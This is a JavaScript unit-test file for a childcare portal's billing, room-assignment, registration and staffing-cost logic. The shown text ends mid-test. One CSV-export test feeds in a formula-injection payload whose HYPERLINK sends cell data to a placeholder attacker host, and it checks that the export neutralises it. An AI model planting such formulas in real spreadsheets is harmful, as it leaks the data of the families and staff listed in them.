// ============================================================
// BUSINESS LOGIC UNIT TESTS
// Tests for core portal logic: room assignment, discounts,
// registration window, billing (weekly rates, multi-child).
//
// Run: node js/tests/business-logic.test.js
// No npm dependencies — uses only Node.js built-ins.
// ============================================================

'use strict';

// ---- Minimal test runner ----

let _passed = 0, _failed = 0;
function describe(label, fn) { console.log(`\n  ${label}`); fn(); }
function test(label, fn) {
    try {
        fn();
        _passed++;
        console.log(`    ✓ ${label}`);
    } catch (err) {
        _failed++;
        console.error(`    ✗ ${label}\n      ${err.message}`);
    }
}
function expect(actual) {
    return {
        toBe: (expected) => {
            if (actual !== expected)
                throw new Error(`expected ${JSON.stringify(expected)}, got ${JSON.stringify(actual)}`);
        },
        toBeNull: () => {
            if (actual !== null)
                throw new Error(`expected null, got ${JSON.stringify(actual)}`);
        },
        toBeCloseTo: (expected, decimals = 2) => {
            const diff = Math.abs(actual - expected);
            if (diff >= Math.pow(10, -decimals) / 2)
                throw new Error(`expected ~${expected}, got ${actual}`);
        },
        toBeGreaterThan: (n) => {
            if (actual <= n) throw new Error(`expected > ${n}, got ${actual}`);
        },
        toBeLessThan: (n) => {
            if (actual >= n) throw new Error(`expected < ${n}, got ${actual}`);
        },
    };
}

// ============================================================
// STUBS — mirror the real ROOMS config from supabase.js
// ============================================================
// `status` mirrors js/supabase.js — getRoomIdFromDob filters on status==='active',
// NOT on room id, so the fixture has to carry it or the room-assignment tests are
// exercising different logic than production.
const ROOMS = [
    { id: 'bear',   status: 'active',   ageMinMonths: 0,  ageMaxMonths: 12,  fullDayRate: 80,  halfDayRate: null, weeklyFullRate: null, weeklyHalfRate: null, fullDayOnly: true },
    { id: 'bee',    status: 'active',   ageMinMonths: 12, ageMaxMonths: 24,  fullDayRate: 75,  halfDayRate: 55,   weeklyFullRate: null, weeklyHalfRate: null, fullDayOnly: false },
    { id: 'turtle', status: 'active',   ageMinMonths: 24, ageMaxMonths: 30,  fullDayRate: 75,  halfDayRate: 45,   weeklyFullRate: null, weeklyHalfRate: null, fullDayOnly: false },
    { id: 'goose',  status: 'active',   ageMinMonths: 30, ageMaxMonths: 36,  fullDayRate: 75,  halfDayRate: 45,   weeklyFullRate: null, weeklyHalfRate: null, fullDayOnly: false },
    { id: 'owl',    status: 'active',   ageMinMonths: 36, ageMaxMonths: null, fullDayRate: 75, halfDayRate: 45,   weeklyFullRate: 300, weeklyHalfRate: 180,  fullDayOnly: false },
    { id: 'summer', status: 'seasonal', ageMinMonths: null, ageMaxMonths: null, fullDayRate: 75, halfDayRate: null, weeklyFullRate: null, weeklyHalfRate: null, hidden: false },
];

// ============================================================
// PURE FUNCTIONS (copied verbatim from app.js / supabase.js)
// These must remain in sync when the source changes.
// ============================================================

function calcAgeMonths(dobStr, referenceDate) {
    if (!dobStr) return null;
    const today = referenceDate || new Date();
    const birth = new Date(dobStr + 'T00:00:00');
    let months = (today.getFullYear() - birth.getFullYear()) * 12
               + (today.getMonth() - birth.getMonth());
    if (today.getDate() < birth.getDate()) months--;
    return months;
}

function roomIdForAgeMonths(months, roomList) {
    if (months == null || months < 0) return null;
    const ageable = (roomList || [])
        .filter(r => r.ageMinMonths != null)
        .sort((a, b) => a.ageMinMonths - b.ageMinMonths);
    for (const room of ageable) {
        if (months >= room.ageMinMonths && (room.ageMaxMonths == null || months < room.ageMaxMonths)) {
            return room.id;
        }
    }
    return null;
}

function getRoomIdFromDob(dobStr, referenceDate) {
    if (!dobStr) return null;
    const months = calcAgeMonths(dobStr, referenceDate);
    return roomIdForAgeMonths(months, ROOMS.filter(r => r.status === 'active'));
}

function effectiveRate(baseRate, discountType, discountValue) {
    if (!baseRate) return 0;
    if (discountType === 'staff') return 0;
    if (discountType === 'custom' && discountValue > 0)
        return Math.round(baseRate * (1 - discountValue / 100) * 100) / 100;
    return baseRate;
}

// centralHour simulates the current hour (0–23) in America/Chicago time.
// Defaults to 12 (noon) so existing tests that don't care about time still pass.
function getRegistrationWindow(today, override = 'auto', centralHour = 12) {
    const day   = today.getDate();
    const year  = today.getFullYear();
    const month = today.getMonth();

    const targetDate  = new Date(year, month + 1, 1);
    const deadlineDate = new Date(year, month, 15);

    const opensToday = (day === 1 && centralHour < 9);
    let mode;
    if (day > 15 || opensToday) {
        mode = 'closed';
    } else {
        mode = 'confirmed';
    }
    if (override === 'open')   mode = 'confirmed';
    if (override === 'closed') mode = 'closed';

    return {
        mode,
        opensToday,
        targetDate,
        targetLabel:  ['January','February','March','April','May','June',
                       'July','August','September','October','November','December'][targetDate.getMonth()]
                      + ' ' + targetDate.getFullYear(),
        deadlineLabel: deadlineDate.toLocaleDateString('en-US', { month: 'long', day: 'numeric' }),
    };
}

function getWeekMonday(dateStr) {
    const d   = new Date(dateStr + 'T00:00:00');
    const dow = d.getDay(); // 0=Sun … 6=Sat
    const toMon = dow === 0 ? -6 : 1 - dow;
    const mon = new Date(d);
    mon.setDate(d.getDate() + toMon);
    return mon.toISOString().slice(0, 10);
}

// Simplified calcTotal for testing (no global state — takes args instead)
function calcTotalForTest(selectedDatesMap, children) {
    if (!children.length) return 0;

    const byWeek = new Map();
    for (const [dateStr, entry] of selectedDatesMap) {
        const wk = getWeekMonday(dateStr);
        if (!byWeek.has(wk)) byWeek.set(wk, []);
        byWeek.get(wk).push({ dateStr, dayType: entry.dayType });
    }

    let total = 0;
    for (const [, days] of byWeek) {
        const isFullWeek = days.length === 5;
        const allFull    = isFullWeek && days.every(d => d.dayType === 'full');
        const allHalf    = isFullWeek && days.every(d => d.dayType === 'half');

        if (allFull || allHalf) {
            // Weekly rate per child
            for (const child of children) {
                const weeklyRate = allFull ? child.room.weeklyFullRate : child.room.weeklyHalfRate;
                if (weeklyRate) {
                    total += effectiveRate(weeklyRate, child.discountType, child.discountValue);
                } else {
                    // No weekly rate configured — sum individual days
                    const dailyRate = allFull ? child.room.fullDayRate : (child.room.halfDayRate || 0);
                    total += 5 * effectiveRate(dailyRate, child.discountType, child.discountValue);
                }
            }
        } else {
            for (const day of days) {
                const sorted = children.map(c => {
                    const base = day.dayType === 'half' ? (c.room.halfDayRate || 0) : (c.room.fullDayRate || 0);
                    return { child: c, eff: effectiveRate(base, c.discountType, c.discountValue) };
                }).sort((a, b) => b.eff - a.eff);

                sorted.forEach((entry, i) => {
                    total += Math.max(0, entry.eff - (i > 0 ? 10 : 0));
                });
            }
        }
    }
    return total;
}

function escHtml(str) {
    return String(str ?? '')
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#39;');
}

// ============================================================
// TESTS
// ============================================================

describe('calcAgeMonths', () => {
    const ref = new Date('2026-03-24');

    test('returns correct month count for a 6-month-old', () => {
        expect(calcAgeMonths('2025-09-24', ref)).toBe(6);
    });
    test('returns 0 for a child born today', () => {
        expect(calcAgeMonths('2026-03-24', ref)).toBe(0);
    });
    test('returns 36 for a 3-year-old', () => {
        expect(calcAgeMonths('2023-03-24', ref)).toBe(36);
    });
    test('returns null for empty string', () => {
        expect(calcAgeMonths('')).toBeNull();
    });
    test('handles month-boundary crossings (e.g., born Oct 31, ref Mar 1)', () => {
        const r = new Date('2026-03-01');
        // Oct→Nov→Dec→Jan→Feb→Mar = 5 calendar months, but the 1st is still
        // 30 days short of the 31st-of-the-month mark, so only 4 are complete.
        expect(calcAgeMonths('2025-10-31', r)).toBe(4);
    });
    test('does not round up early when the day-of-month has not been reached yet', () => {
        // Born Mar 28, 2025; as of Mar 24, 2026 they are 11 months old, not 12 —
        // their 12-month "birthday" is 4 days away. A year/month-only diff
        // (ignoring day-of-month) would wrongly report 12 here.
        expect(calcAgeMonths('2025-03-28', new Date('2026-03-24'))).toBe(11);
    });
});

describe('getRoomIdFromDob — age-based room assignment', () => {
    const ref = new Date('2026-03-24');
    // Helper: produce DOB that gives exactly N months of age on ref date
    const dobAtMonths = m => {
        const d = new Date(ref);
        d.setMonth(d.getMonth() - m);
        return d.toISOString().slice(0, 10);
    };

    test('newborn (0 months) → bear room', () => {
        expect(getRoomIdFromDob(dobAtMonths(0), ref)).toBe('bear');
    });
    test('11 months → bear room (upper boundary)', () => {
        expect(getRoomIdFromDob(dobAtMonths(11), ref)).toBe('bear');
    });
    test('12 months → bee room', () => {
        expect(getRoomIdFromDob(dobAtMonths(12), ref)).toBe('bee');
    });
    test('23 months → bee room (upper boundary)', () => {
        expect(getRoomIdFromDob(dobAtMonths(23), ref)).toBe('bee');
    });
    test('24 months → turtle room', () => {
        expect(getRoomIdFromDob(dobAtMonths(24), ref)).toBe('turtle');
    });
    test('29 months → turtle room (upper boundary)', () => {
        expect(getRoomIdFromDob(dobAtMonths(29), ref)).toBe('turtle');
    });
    test('30 months → goose room', () => {
        expect(getRoomIdFromDob(dobAtMonths(30), ref)).toBe('goose');
    });
    test('35 months → goose room (upper boundary)', () => {
        expect(getRoomIdFromDob(dobAtMonths(35), ref)).toBe('goose');
    });
    test('36 months → owl room', () => {
        expect(getRoomIdFromDob(dobAtMonths(36), ref)).toBe('owl');
    });
    test('60 months (5 yrs) → owl room (no upper bound)', () => {
        expect(getRoomIdFromDob(dobAtMonths(60), ref)).toBe('owl');
    });
    test('future DOB (negative age) → null', () => {
        expect(getRoomIdFromDob('2030-01-01', ref)).toBeNull();
    });
    test('a few days shy of the 12-month mark stays in bear, not bee', () => {
        // Turns 12 months on Mar 28, 2026 — still bear as of Mar 24.
        expect(getRoomIdFromDob('2025-03-28', ref)).toBe('bear');
    });
    test('null/empty DOB → null', () => {
        expect(getRoomIdFromDob(null)).toBeNull();
        expect(getRoomIdFromDob('')).toBeNull();
    });
});

describe('effectiveRate — discount calculation', () => {
    test('no discount returns base rate unchanged', () => {
        expect(effectiveRate(75, 'none', 0)).toBe(75);
    });
    test('staff discount → 0', () => {
        expect(effectiveRate(75, 'staff', 0)).toBe(0);
    });
    test('custom 20% off $75 → $60', () => {
        expect(effectiveRate(75, 'custom', 20)).toBe(60);
    });
    test('custom 10% off $55 → $49.50', () => {
        expect(effectiveRate(55, 'custom', 10)).toBeCloseTo(49.5);
    });
    test('custom 0% → base rate unchanged', () => {
        expect(effectiveRate(75, 'custom', 0)).toBe(75);
    });
    test('zero base rate → 0 regardless of discount type', () => {
        expect(effectiveRate(0, 'none', 0)).toBe(0);
        expect(effectiveRate(0, 'custom', 50)).toBe(0);
    });
    test('result is rounded to 2 decimal places', () => {
        // 75 * (1 - 33/100) = 75 * 0.67 = 50.25
        expect(effectiveRate(75, 'custom', 33)).toBe(50.25);
    });
});

describe('getRegistrationWindow — registration open/close logic', () => {
    test('day 1 at 9 AM → open (mode: confirmed)', () => {
        expect(getRegistrationWindow(new Date('2026-03-01'), 'auto', 9).mode).toBe('confirmed');
    });
    test('day 1 at 8:59 AM → closed (before 9 AM)', () => {
        expect(getRegistrationWindow(new Date('2026-03-01'), 'auto', 8).mode).toBe('closed');
    });
    test('day 1 at midnight → closed (before 9 AM)', () => {
        expect(getRegistrationWindow(new Date('2026-03-01'), 'auto', 0).mode).toBe('closed');
    });
    test('day 15 → open (boundary)', () => {
        expect(getRegistrationWindow(new Date('2026-03-15')).mode).toBe('confirmed');
    });
    test('day 16 → closed', () => {
        expect(getRegistrationWindow(new Date('2026-03-16')).mode).toBe('closed');
    });
    test('day 31 → closed', () => {
        expect(getRegistrationWindow(new Date('2026-01-31')).mode).toBe('closed');
    });
    test('override "open" forces mode to confirmed even after day 15', () => {
        expect(getRegistrationWindow(new Date('2026-03-20'), 'open').mode).toBe('confirmed');
    });
    test('override "open" forces mode to confirmed even before 9 AM on the 1st', () => {
        expect(getRegistrationWindow(new Date('2026-03-01'), 'open', 7).mode).toBe('confirmed');
    });
    test('override "closed" forces mode to closed even on day 1 at 9 AM', () => {
        expect(getRegistrationWindow(new Date('2026-03-01'), 'closed', 9).mode).toBe('closed');
    });
    test('target month is always next calendar month', () => {
        const win = getRegistrationWindow(new Date('2026-03-10'));
        expect(win.targetDate.getMonth()).toBe(3);  // April (0-indexed)
        expect(win.targetDate.getFullYear()).toBe(2026);
    });
    test('target month wraps to January next year in December', () => {
        const win = getRegistrationWindow(new Date('2026-12-10'));
        expect(win.targetDate.getMonth()).toBe(0);  // January
        expect(win.targetDate.getFullYear()).toBe(2027);
    });
});

describe('getWeekMonday — ISO Monday of a week', () => {
    test('Wednesday → Monday of same week', () => {
        expect(getWeekMonday('2026-03-25')).toBe('2026-03-23'); // Wed → Mon
    });
    test('Monday → itself', () => {
        expect(getWeekMonday('2026-03-23')).toBe('2026-03-23');
    });
    test('Sunday → previous Monday', () => {
        expect(getWeekMonday('2026-03-22')).toBe('2026-03-16');
    });
    test('Friday → Monday of same week', () => {
        expect(getWeekMonday('2026-03-27')).toBe('2026-03-23');
    });
    test('crosses month boundary correctly', () => {
        expect(getWeekMonday('2026-04-01')).toBe('2026-03-30'); // Wed Apr 1 → Mon Mar 30
    });
});

describe('calcTotalForTest — billing totals', () => {
    const owlRoom = ROOMS.find(r => r.id === 'owl');   // has weeklyFullRate: 300
    const beeRoom = ROOMS.find(r => r.id === 'bee');   // no weekly rate

    const noDisc = { discountType: 'none', discountValue: 0 };
    const child1 = { room: owlRoom, ...noDisc };

    test('single child, single full day → full day rate', () => {
        const dates = new Map([['2026-03-23', { dayType: 'full' }]]);
        expect(calcTotalForTest(dates, [child1])).toBe(75);
    });
    test('single child, single half day → half day rate', () => {
        const dates = new Map([['2026-03-23', { dayType: 'half' }]]);
        expect(calcTotalForTest(dates, [child1])).toBe(45);
    });
    test('full week Mon–Fri, owl room (weeklyFullRate=300) → 300', () => {
        const dates = new Map([
            ['2026-03-23', { dayType: 'full' }],
            ['2026-03-24', { dayType: 'full' }],
            ['2026-03-25', { dayType: 'full' }],
            ['2026-03-26', { dayType: 'full' }],
            ['2026-03-27', { dayType: 'full' }],
        ]);
        expect(calcTotalForTest(dates, [child1])).toBe(300);
    });
    test('4 days (not a full week) → 4 × daily rate', () => {
        const dates = new Map([
            ['2026-03-23', { dayType: 'full' }],
            ['2026-03-24', { dayType: 'full' }],
            ['2026-03-25', { dayType: 'full' }],
            ['2026-03-26', { dayType: 'full' }],
        ]);
        expect(calcTotalForTest(dates, [child1])).toBe(4 * 75);
    });
    test('full week, bee room (no weekly rate) → 5 × daily rate', () => {
        const beeChild = { room: beeRoom, ...noDisc };
        const dates = new Map([
            ['2026-03-23', { dayType: 'full' }],
            ['2026-03-24', { dayType: 'full' }],
            ['2026-03-25', { dayType: 'full' }],
            ['2026-03-26', { dayType: 'full' }],
            ['2026-03-27', { dayType: 'full' }],
        ]);
        expect(calcTotalForTest(dates, [beeChild])).toBe(5 * 75);
    });
    test('two children, 1 day: second child gets $10 multi-child discount', () => {
        const child2 = { room: owlRoom, ...noDisc };
        const dates = new Map([['2026-03-23', { dayType: 'full' }]]);
        // child1: $75, child2: $75 - $10 = $65 → total $140
        expect(calcTotalForTest(dates, [child1, child2])).toBe(140);
    });
    test('staff discount child → $0 regardless of day type', () => {
        const staffChild = { room: owlRoom, discountType: 'staff', discountValue: 0 };
        const dates = new Map([['2026-03-23', { dayType: 'full' }]]);
        expect(calcTotalForTest(dates, [staffChild])).toBe(0);
    });
    test('custom 20% discount applied to daily rate', () => {
        const discChild = { room: owlRoom, discountType: 'custom', discountValue: 20 };
        // $75 * 0.80 = $60
        const dates = new Map([['2026-03-23', { dayType: 'full' }]]);
        expect(calcTotalForTest(dates, [discChild])).toBe(60);
    });
    test('empty dates → 0', () => {
        expect(calcTotalForTest(new Map(), [child1])).toBe(0);
    });
    test('no children → 0', () => {
        const dates = new Map([['2026-03-23', { dayType: 'full' }]]);
        expect(calcTotalForTest(dates, [])).toBe(0);
    });
});

describe('escHtml — XSS sanitization', () => {
    test('escapes < and >', () => {
        expect(escHtml('<script>')).toBe('&lt;script&gt;');
    });
    test('escapes &', () => {
        expect(escHtml('A & B')).toBe('A &amp; B');
    });
    test('escapes double quotes', () => {
        expect(escHtml('"quoted"')).toBe('&quot;quoted&quot;');
    });
    test('escapes single quotes', () => {
        expect(escHtml("it's")).toBe('it&#39;s');
    });
    test('plain text unchanged', () => {
        expect(escHtml('Alice Smith')).toBe('Alice Smith');
    });
    test('null/undefined → empty string', () => {
        expect(escHtml(null)).toBe('');
        expect(escHtml(undefined)).toBe('');
    });
    test('number converted to string', () => {
        expect(escHtml(42)).toBe('42');
    });
});

// ---- csvCell (copy of js/admin/admin-core.js) ----
function csvCell(val) {
    let str = String(val ?? '');
    if (/^[=+\-@\t\r]/.test(str)) str = `'${str}`;
    return str.includes(',') || str.includes('"') || str.includes('\n')
        ? `"${str.replace(/"/g, '""')}"` : str;
}

describe('csvCell — RFC 4180 quoting + formula-injection guard', () => {
    test('plain text passes through', () => {
        expect(csvCell('Alice Smith')).toBe('Alice Smith');
    });
    test('comma forces quoting', () => {
        expect(csvCell('Smith, Alice')).toBe('"Smith, Alice"');
    });
    test('embedded quote is doubled', () => {
        expect(csvCell('the "Bear" room')).toBe('"the ""Bear"" room"');
    });
    test('newline forces quoting', () => {
        expect(csvCell('line1\nline2')).toBe('"line1\nline2"');
    });
    test('null/undefined → empty string', () => {
        expect(csvCell(null)).toBe('');
        expect(csvCell(undefined)).toBe('');
    });
    test('number is stringified', () => {
        expect(csvCell(42)).toBe('42');
    });

    // R17 — a parent-supplied name starting with =, +, - or @ executes when the
    // export is opened in Excel/Sheets. The apostrophe forces text, and is not
    // displayed by the spreadsheet.
    test('leading = is neutralised', () => {
        expect(csvCell('=HYPERLINK("http://evil.tld?"&A1)'))
            .toBe('"\'=HYPERLINK(""http://evil.tld?""&A1)"');
    });
    test('leading + is neutralised', () => {
        expect(csvCell('+1234')).toBe("'+1234");
    });
    test('leading - is neutralised', () => {
        expect(csvCell('-1+1')).toBe("'-1+1");
    });
    test('leading @ is neutralised', () => {
        expect(csvCell('@SUM(A1:A9)')).toBe("'@SUM(A1:A9)");
    });
    test('a hyphen mid-string is left alone', () => {
        expect(csvCell('Mary-Jane')).toBe('Mary-Jane');
    });
    test('phone number keeps its leading plus escaped, still one field', () => {
        expect(csvCell('+1 (314) 555-0100')).toBe("'+1 (314) 555-0100");
    });
});

// ============================================================
// SOURCE-DRIFT GUARD
// ------------------------------------------------------------
// The functions above are copies of production code, because js/*.js are plain
// browser globals with top-level side effects and cannot be require()d from
// Node. That makes every test above vacuous on its own: change effectiveRate()
// in js/app.js and all of these still pass.
//
// This guard closes that gap. It reads the real source, extracts the named
// function by brace-matching, normalises whitespace/comments, and compares it to
// the copy in this file. If production changes and the copy is not re-synced,
// the suite goes red and names the function.
//
// It is not a substitute for importing the real code — the proper fix is to
// extract these pure functions into a side-effect-free module both the browser
// and Node can load — but it does mean divergence can no longer happen silently.
// (It caught a real one: getRoomIdFromDob had already been refactored in
// supabase.js to filter on status==='active' while this file still filtered on
// id !== 'summer'.)
// ============================================================
const fs   = require('fs');
const path = require('path');

function extractFunction(sourceText, name) {
    const start = sourceText.search(new RegExp(`^function\\s+${name}\\s*\\(`, 'm'));
    if (start === -1) return null;
    const open = sourceText.indexOf('{', start);
    let depth = 0, i = open;
    for (; i < sourceText.length; i++) {
        const c = sourceText[i];
        if (c === '{') depth++;
        else if (c === '}') { depth--; if (depth === 0) { i++; break; } }
    }
    return sourceText.slice(start, i);
}

// Strip comments and collapse whitespace so formatting-only edits don't trip it.
function normalise(fnText) {
    return fnText
        .replace(/\/\*[\s\S]*?\*\//g, '')
        .replace(/\/\/[^\n]*/g, '')
        .replace(/\s+/g, ' ')
        .trim();
}

// ── Ratio-step / next-child calculator (copied from js/admin/admin-reports.js) ──
// Staffing is a step function: a room needs ceil(children / ratio) teachers, so
// the child crossing a boundary carries the cost of a whole extra teacher-day.
const SHIFT_HRS = { am: 5, pm: 5 };
const RATIO_STEP_DAY_HOURS = SHIFT_HRS.am + SHIFT_HRS.pm;
let allRegistrations = [];

function _ratioStepWage(staff, roomId) {
    const hourly = staff.filter(s => s.pay_type === 'hourly' && Number(s.hourly_rate) > 0);
    const inRoom = hourly.filter(s => s.room_id === roomId);
    const pool   = inRoom.length ? inRoom : hourly;
    if (!pool.length) return 0;
    return pool.reduce((sum, s) => sum + Number(s.hourly_rate), 0) / pool.length;
}

function _buildRatioStepRows(weekDates, rooms, staff) {
    const counts = {};                       // date → roomId → { total, half }
    weekDates.forEach(d => { counts[d] = {}; });

    allRegistrations.forEach(reg => {
        if (reg.status !== 'confirmed') return;
        (reg.registration_dates || []).forEach(rd => {
            if (rd.waitlisted || !counts[rd.care_date]) return;
            const roomId = rd.room_id || reg.room_id;
            if (!roomId) return;
            const c = counts[rd.care_date][roomId] ||
                      (counts[rd.care_date][roomId] = { total: 0, half: 0 });
            c.total++;
            if (rd.day_type === 'half') c.half++;
        });
    });

    const wageByRoom = {};
    rooms.forEach(r => { wageByRoom[r.id] = _ratioStepWage(staff, r.id); });

    const rows = [];
    weekDates.forEach(date => {
        rooms.forEach(room => {
            const c        = counts[date][room.id] || { total: 0, half: 0 };
            const ratio    = room.staffRatio || 0;
            const capacity = room.capacity   || 0;
            const rate     = room.fullDayRate || 0;
            const wage     = wageByRoom[room.id] || 0;
            const teacherDayCost = wage * RATIO_STEP_DAY_HOURS;

            // ceil() is the step. With 0 children 0 teachers are required, so
            // the first child of the day genuinely does cost a whole teacher —
            // that is a real step, not an edge case to paper over.
            const staffReq  = ratio > 0 ? Math.ceil(c.total / ratio) : null;
            const headroom  = ratio > 0 ? staffReq * ratio - c.total : null;
            const openSeats = capacity > 0 ? capacity - c.total : null;

            let verdict, nextMargin = null, nextCost = null;
            if (openSeats !== null && openSeats <= 0) {
                verdict = 'full';                       // no seat to sell
            } else if (ratio <= 0) {
                verdict = 'no-ratio';                   // ratio not configured
            } else if (headroom > 0) {
                verdict = 'free';                       // absorbed by current staff
                nextMargin = rate;
                nextCost   = 0;
            } else {
                // headroom === 0 → the next child trips the ratio
                verdict    = c.total === 0 ? 'opens' : 'step';
                nextCost   = teacherDayCost;
                nextMargin = teacherDayCost > 0 ? rate - teacherDayCost : null;
            }

            rows.push({
                date, roomId: room.id, roomLabel: room.label,
                children: c.total, half: c.half, ratio, capacity,
                staffReq, headroom, openSeats,
                rate, wage, nextCost, nextMargin, verdict,
            });
        });
    });
    return rows;
}

// Test helpers
function _rsRoom(over = {}) {
    return Object.assign({ id: 'a', label: 'A', staffRatio: 4, capacity: 12, fullDayRate: 75 }, over);
}
function _rsBook(list) {
    allRegistrations = list.map(b => ({
        status: b.status || 'confirmed',
        room_id: b.room || 'a',
        registration_dates: [{
            care_date: b.date || '2026-08-11',
            room_id: b.room || 'a',
            day_type: b.t || 'full',
            waitlisted: !!b.wl,
        }],
    }));
}
function _rsRun(rooms, staff, bookings, dates = ['2026-08-11']) {
    _rsBook(bookings);
    return _buildRatioStepRows(dates, rooms, staff);
}
const _RS_WAGE = [{ pay_type: 'hourly', hourly_rate: 20, room_id: null }];
const _rsFill = (n, room = 'a') => Array.from({ length: n }, () => ({ room }));

describe('_ratioStepWage — pricing one more teacher-day', () => {
    test('averages the hourly staff assigned to the room', () => {
        expect(_ratioStepWage([
            { pay_type: 'hourly', hourly_rate: 16, room_id: 'a' },
            { pay_type: 'hourly', hourly_rate: 20, room_id: 'a' },
        ], 'a')).toBe(18);
    });
    test('falls back to the center-wide average when the room has nobody', () => {
        expect(_ratioStepWage([
            { pay_type: 'hourly', hourly_rate: 10, room_id: 'b' },
            { pay_type: 'hourly', hourly_rate: 30, room_id: 'c' },
        ], 'a')).toBe(20);
    });
    test('room-assigned staff take precedence over the center average', () => {
        expect(_ratioStepWage([
            { pay_type: 'hourly', hourly_rate: 50, room_id: 'a' },
            { pay_type: 'hourly', hourly_rate: 10, room_id: 'b' },
        ], 'a')).toBe(50);
    });
    test('salaried staff are excluded — a salary does not change with a child', () => {
        expect(_ratioStepWage([{ pay_type: 'salary', salary_biweekly: 2000, room_id: 'a' }], 'a')).toBe(0);
    });
    test('zero and missing rates are ignored rather than averaged in', () => {
        expect(_ratioStepWage([
            { pay_type: 'hourly', hourly_rate: 0,  room_id: 'a' },
            { pay_type: 'hourly', hourly_rate: 20, room_id: 'a' },
        ], 'a')).toBe(20);
    });
    test('no wage data at all returns 0 (callers must treat as unknown)', () => {
        expect(_ratioStepWage([], 'a')).toBe(0);
    });
});

describe('_buildRatioStepRows — the ratio step', () => {
    test('staff required is ceil(children / ratio)', () => {
        const r = _rsRun([_rsRoom()], _RS_WAGE, _rsFill(9))[0];   // 9 kids, 1:4
        expect(r.staffReq).toBe(3);
    });
    test('headroom counts children who still fit under current staff', () => {
        const r = _rsRun([_rsRoom()], _RS_WAGE, _rsFill(9))[0];   // 3 staff cover 12
        expect(r.headroom).toBe(3);
    });
    test('exactly on the boundary leaves zero headroom', () => {
        const r = _rsRun([_rsRoom()], _RS_WAGE, _rsFill(8))[0];   // 8 kids, 1:4 → 2 staff
        expect(r.headroom).toBe(0);
        expect(r.verdict).toBe('step');
    });
    test('within a block the next child is absorbed at full rate', () => {
        const r = _rsRun([_rsRoom()], _RS_WAGE, _rsFill(5))[0];
        expect(r.verdict).toBe('free');
        expect(r.nextMargin).toBe(75);
        expect(r.nextCost).toBe(0);
    });
    test('the child that trips the ratio pays for a whole teacher-day', () => {
        const r = _rsRun([_rsRoom()], _RS_WAGE, _rsFill(8))[0];
        expect(r.nextCost).toBe(200);              // 20/hr x 10 h
        expect(r.nextMargin).toBe(-125);           // 75 rate - 200 labor
    });
    test('an empty room is a step — the first child needs a teacher', () => {
        const r = _rsRun([_rsRoom()], _RS_WAGE, [])[0];
        expect(r.children).toBe(0);
        expect(r.staffReq).toBe(0);
        expect(r.verdict).toBe('opens');
        expect(r.nextMargin).toBe(-125);
    });
    test('a full room reports no sellable seat and no margin', () => {
        const r = _rsRun([_rsRoom({ capacity: 4 })], _RS_WAGE, _rsFill(4))[0];
        expect(r.openSeats).toBe(0);
        expect(r.verdict).toBe('full');
        expect(r.nextMargin).toBeNull();
    });
    test('an overbooked room is still full, not sellable', () => {
        const r = _rsRun([_rsRoom({ capacity: 3 })], _RS_WAGE, _rsFill(4))[0];
        expect(r.openSeats).toBe(-1);
        expect(r.verdict).toBe('full');
    });
    test('an unset ratio is reported, never guessed', () => {
        const r = _rsRun([_rsRoom({ staffRatio: 0 })], _RS_WAGE, _rsFill(4))[0];
        expect(r.staffReq).toBeNull();
        expect(r.headroom).toBeNull();
        expect(r.verdict).toBe('no-ratio');
    });
    test('unknown wage yields a null margin, not a free teacher', () => {
        const r = _rsRun([_rsRoom()], [], _rsFill(8))[0];
        expect(r.verdict).toBe('step');
        expect(r.nextMargin).toBeNull();
    });
    test('unset capacity still computes the ratio step', () => {
        const r = _rsRun([_rsRoom({ capacity: 0 })], _RS_WAGE, _rsFill(8))[0];
        expect(r.openSeats).toBeNull();
        expect(r.verdict).toBe('step');
    });
    test('half-day children count toward the ratio (present at the morning peak)', () => {
        const r = _rsRun([_rsRoom()], _RS_WAGE,
            [...Array(4).fill({ room: 'a', t: 'half' }), ...Array(4).fill({ room: 'a' })])[0];
        expect(r.children).toBe(8);
        expect(r.half).toBe(4);
        expect(r.staffReq).toBe(2);
    });
    test('waitlisted bookings are excluded from the count', () => {
        const r = _rsRun([_rsRoom()], _RS_WAGE, [{ room: 'a' }, { room: 'a', wl: true }])[0];
        expect(r.children).toBe(1);
    });
    test('unconfirmed registrations are excluded from the count', () => {
        const r = _rsRun([_rsRoom()], _RS_WAGE, [{ room: 'a' }, { room: 'a', status: 'pending' }])[0];
        expect(r.children).toBe(1);
    });
    test('per-date room override wins over the registration room', () => {
        allRegistrations = [{ status: 'confirmed', room_id: 'b', registration_dates: [
            { care_date: '2026-08-11', room_id: 'a', day_type: 'full', waitlisted: false }] }];
        const r = _buildRatioStepRows(['2026-08-11'], [_rsRoom()], _RS_WAGE)[0];
        expect(r.children).toBe(1);
    });
    test('emits one row per room per day', () => {
        const rows = _rsRun([_rsRoom(), _rsRoom({ id: 'b', label: 'B' })], _RS_WAGE,
            _rsFill(2), ['2026-08-11', '2026-08-12']);
        expect(rows.length).toBe(4);
    });
    test('bookings outside the requested week are ignored', () => {
        const r = _rsRun([_rsRoom()], _RS_WAGE,
            [{ room: 'a' }, { room: 'a', date: '2026-09-01' }])[0];
        expect(r.children).toBe(1);
    });
    test('real case — Bear Room, 6 children at 1:3, is one child from a 3rd teacher', () => {
        const bear = _rsRoom({ id: 'bear', staffRatio: 3, capacity: 9, fullDayRate: 80 });
        const r = _rsRun([bear], [{ pay_type: 'hourly', hourly_rate: 16.83, room_id: 'bear' }],
            _rsFill(6, 'bear'))[0];
        expect(r.staffReq).toBe(2);
        expect(r.headroom).toBe(0);
        expect(r.openSeats).toBe(3);          // seats look available...
        expect(r.verdict).toBe('step');       // ...but the ratio says otherwise
        expect(r.nextMargin).toBeCloseTo(-88.3, 1);
    });
});

describe('source-drift guard — copies must match js/ source', () => {
    const repoRoot = path.resolve(__dirname, '..', '..');
    const selfText = fs.readFileSync(__filename, 'utf8');

    const GUARDED = [
        ['calcAgeMonths',      'js/supabase.js'],
        ['roomIdForAgeMonths', 'js/supabase.js'],
        ['getRoomIdFromDob',   'js/supabase.js'],
        ['effectiveRate',      'js/app.js'],
        ['getWeekMonday',      'js/app.js'],
        ['csvCell',            'js/admin/admin-core.js'],
        ['_ratioStepWage',     'js/admin/admin-reports.js'],
        ['_buildRatioStepRows','js/admin/admin-reports.js'],
    ];

    for (const [fnName, relPath] of GUARDED) {
        test(`${fnName} matches ${relPath}`, () => {
            const srcText = fs.readFileSync(path.join(repoRoot, relPath), 'utf8');
            const fromSource = extractFunction(srcText, fnName);
            const fromTest   = extractFunction(selfText, fnName);

